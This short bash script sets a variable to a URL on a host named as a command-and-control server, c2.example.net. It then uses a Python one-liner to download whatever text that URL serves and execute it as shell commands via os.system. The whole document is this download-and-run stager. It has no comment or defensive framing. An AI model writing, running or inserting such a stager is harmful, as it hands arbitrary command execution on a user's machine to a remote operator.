#!/bin/bash
export P=http://c2.example.net/s
python3 -c "import urllib.request,os;os.system(urllib.request.urlopen(os.environ['P']).read().decode())"
